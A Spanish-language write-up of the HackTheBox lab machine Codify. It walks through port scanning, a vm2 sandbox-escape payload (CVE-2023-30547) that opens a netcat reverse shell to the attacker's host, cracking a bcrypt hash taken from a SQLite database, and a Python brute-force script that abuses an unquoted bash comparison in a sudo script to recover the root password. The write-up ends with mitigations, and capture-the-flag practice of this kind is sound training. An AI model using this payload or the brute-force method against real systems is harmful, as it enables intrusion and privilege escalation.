---
title: "Codify - HackTheBox"
description: "Writeup de la máquina Codify de HackTheBox, una máquina Linux de dificultad fácil que involucra explotación de vm2 sandbox y escalada mediante script bash."
pubDate: 2024-11-02
platform: "htb"
category: "machines"
difficulty: "easy"
os: "linux"
language: es
tags: ["vm2", "sandbox-escape", "bash", "password-cracking", "CVE-2023-30547"]
retired: false
logo: "/images/writeups/htb/codify/logo.png"
heroImage: "/images/writeups/htb/codify/card.png"
attackVectors: ["web"]
techniques: ["T1190", "T1068", "T1059.004"]
vulnerabilities: ["CVE-2023-30547"]
certifications: ["OSCP", "eJPT"]
skillLevel: "beginner"
estimatedTime: "1-2 horas"
points: 20
rating: 4.5
---

# Codify - HackTheBox Writeup

**Dificultad**: Easy  
**OS**: Linux  
**Plataforma**: HackTheBox  
**IP**: 10.10.11.239

## Introducción

Codify es una máquina Linux de dificultad fácil que presenta un servicio web que permite ejecutar código Node.js en un sandbox vm2. Explotaremos una vulnerabilidad conocida para escapar del sandbox y luego escalaremos privilegios mediante análisis de un script bash vulnerable.

## Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.239 -oG allPorts
```

**Puertos abiertos:**
- 22/tcp - SSH
- 80/tcp - HTTP
- 3000/tcp - HTTP (Node.js)

### Escaneo de servicios

```bash
nmap -p22,80,3000 -sCV 10.10.11.239 -oN targeted
```

**Resultados:**
- **22/tcp** - OpenSSH 8.9p1 Ubuntu
- **80/tcp** - Apache httpd 2.4.52
- **3000/tcp** - Node.js Express framework

## Enumeración Web

Al acceder al puerto 80, encontramos un sitio web que ofrece un "Node.js Code Editor" que permite ejecutar código Node.js en un entorno sandbox.

### Tecnologías identificadas

El sitio menciona que usa **vm2** para crear un sandbox seguro. Investigando, descubrimos que vm2 tiene una vulnerabilidad crítica: **CVE-2023-30547**.

## Explotación

### CVE-2023-30547 - Sandbox Escape en vm2

Esta vulnerabilidad permite escapar del sandbox vm2 y ejecutar código arbitrario en el sistema.

**Payload:**

```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
const err = new Error();
err.name = {
  toString: new Proxy(() => "", {
    apply(target, thiz, args) {
      const process = args.constructor.constructor('return process')();
      throw process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.5 443 >/tmp/f').toString();
    },
  }),
};
try {
  err.stack;
} catch (stdout) {
  stdout;
}
`;

console.log(vm.run(code));
```

### Reverse Shell

1. Configuramos un listener:

```bash
nc -lvnp 443
```

2. Ejecutamos el exploit en el editor web
3. Obtenemos shell como usuario `svc`

### Tratamiento de la TTY

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
```

## Post-Explotación

### Enumeración del sistema

```bash
id
whoami
ls -la /home
```

Encontramos usuarios:
- svc
- joshua

### Base de datos SQLite

Explorando el sistema, encontramos una base de datos en `/var/www/contact/`:

```bash
cd /var/www/contact
ls -la
```

Encontramos `tickets.db`. La examinamos:

```bash
sqlite3 tickets.db
.tables
SELECT * FROM users;
```

**Credencial encontrada:**
- Usuario: joshua
- Hash: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

### Cracking del hash

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

o con John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Contraseña crackeada:** spongebob1

### SSH como joshua

```bash
ssh joshua@10.10.11.239
# Password: spongebob1
```

**User flag:**
```bash
cat /home/joshua/user.txt
```

## Escalada de Privilegios

### Enumeración de privilegios sudo

```bash
sudo -l
```

Encontramos que joshua puede ejecutar `/opt/scripts/mysql-backup.sh` como root.

### Análisis del script

```bash
cat /opt/scripts/mysql-backup.sh
```

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

echo "Enter MySQL password for $DB_USER:"
read -s USER_PASS

if [[ $DB_PASS == $USER_PASS ]]; then
        echo "Password confirmed!"
else
        echo "Password confirmation failed!"
        exit 1
fi
```

### Vulnerabilidad en la comparación

El script usa `==` en bash sin comillas, lo que permite pattern matching. Podemos explotar esto con un ataque de fuerza bruta carácter por carácter.

### Script de explotación

```python
#!/usr/bin/env python3
import subprocess
import string

charset = string.ascii_letters + string.digits
password = ""

while True:
    found = False
    for char in charset:
        test_pass = password + char + "*"
        cmd = f"echo '{test_pass}' | sudo /opt/scripts/mysql-backup.sh"
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if "Password confirmed!" in result.stdout:
            password += char
            print(f"[+] Password so far: {password}")
            found = True
            break
    
    if not found:
        break

print(f"[+] Final password: {password}")
```

**Contraseña de root:** kljh12k3jhaskjh12kjh3

### Root Shell

```bash
su root
# Password: kljh12k3jhaskjh12kjh3
```

**Root flag:**
```bash
cat /root/root.txt
```

## Conclusión

Codify es una excelente máquina para practicar:
- Explotación de vulnerabilidades en sandboxes (CVE-2023-30547)
- Análisis de bases de datos SQLite
- Cracking de hashes bcrypt
- Análisis de scripts bash y explotación de comparaciones inseguras
- Ataques de timing/pattern matching

**Lecciones aprendidas:**
- Las implementaciones de sandbox pueden tener vulnerabilidades críticas
- Siempre validar credenciales de forma segura en scripts
- Usar comillas en comparaciones bash para evitar pattern matching
- La enumeración exhaustiva es clave para encontrar vectores de escalada

**Mitigaciones:**
- Actualizar vm2 a la última versión
- Usar comparaciones seguras en bash con comillas dobles
- No almacenar contraseñas en texto plano
- Implementar rate limiting en operaciones sensibles
